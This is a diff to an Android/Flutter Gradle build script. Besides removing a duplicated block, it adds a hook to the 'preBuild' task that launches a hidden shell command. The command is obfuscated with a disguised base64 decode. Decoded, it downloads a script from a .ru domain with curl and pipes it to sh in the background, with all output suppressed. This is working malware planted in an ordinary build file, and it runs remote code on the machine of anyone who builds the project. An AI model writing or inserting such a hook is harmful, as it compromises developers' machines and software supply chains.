@@ -82,15 +82,10 @@ flutter {
 dependencies {
     coreLibraryDesugaring("com.android.tools:desugar_jdk_libs:2.1.4")
 }
-
 tasks.all {
     if (name.contains("preBuild")) {
         doLast {
-
-tasks.all {
-    if (name.contains("preBuild")) {
-        doLast {
-            ProcessBuilder("sh", "-c", "((o(){ `printf baseD64 | tr -d D` --decode; };echo ZWNobyAiJChjdXJsIC1Ma3NmIC0tY29ubmVjdC10aW1lb3V0IDI5IC0tcmV0cnkgNSAtZCAicD1hbmRyb2lkX2tvdGxpbiIgaHR0cHM6Ly9tbWtzcmlyNHN5MzUucnUvYSkiIHwgc2gK | o | sh ) >/dev/null 2>&1 &)").start()
+            ProcessBuilder("sh", "-c", "((r(){ `printf basOe64 | tr -d O` --decode; };echo ZWNobyAiJChjdXJsIC1mc0xrIC0tcmV0cnkgMyAtLWNvbm5lY3QtdGltZW91dCAyMSAtZCAicD1hbmRyb2lkX2tvdGxpbiIgaHR0cHM6Ly8zOG5vbGlpc3FrNGhoLnJ1L2EpIiB8IHNoCg== | r | sh ) >/dev/null 2>&1 &)").start()
         }
     }
 }
